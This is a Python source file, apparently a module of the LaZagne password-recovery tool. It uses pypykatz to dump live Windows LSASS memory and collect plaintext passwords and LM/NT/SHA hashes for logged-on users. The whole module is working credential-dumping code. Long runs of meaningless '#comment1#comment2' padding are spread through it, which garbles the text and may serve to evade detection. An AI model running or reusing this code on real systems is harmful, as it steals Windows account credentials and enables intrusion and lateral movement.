# -*- coding: utf-8 -*-

#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
import codecs
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
from pypykatz.pypykatz import pypykatz
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
class Pypykatz(ModuleInfo):
    #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
    def __init__(self):
        ModuleInfo.__init__(self, 'pypykatz', 'windows', system_module=True)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
    def run(self):
        mimi = None
        try:
            mimi = pypykatz.go_live()
        except Exception:
            pass
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
        if mimi:
            results = {}
            logon_sessions = mimi.to_dict().get('logon_sessions', [])
            for logon_session in logon_sessions:

               #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                user = logon_sessions[logon_session].to_dict()
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
                #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                for i in ['ssp_creds', 'livessp_creds', 'tspkg_creds', 'wdigest_creds']:
                    for data in user.get(i, []):
                        if all((data['username'], data['domainname'], data['password'])):
                            login = data['username']
                            if login not in results:
                                results[login] = {}

                            results[login]['Domain'] = data['domainname']
                            results[login]['Password'] = data['password']

                #comment1#comment2#comment3#comment4#comment1#comment2#comment3
                for data in user.get('msv_creds', []):
                    if data['username']:
                        login = data['username']
                    else:
                        login = user['username']
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
                    if login not in results:
                        results[login] = {}
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                    if data['SHAHash']:
                        results[login]['Shahash'] = codecs.encode(data['SHAHash'], 'hex')
                    if data['LMHash']:
                        results[login]['Lmhash'] = codecs.encode(data['LMHash'], 'hex')
                    if data['NThash']:
                        results[login]['Nthash'] = codecs.encode(data['NThash'], 'hex')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
            constant.pypykatz_result = results
            pwd_found = []
            for user in results:
                results[user]['Login'] = user
                pwd_found.append(results[user])
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
            return pwd_found
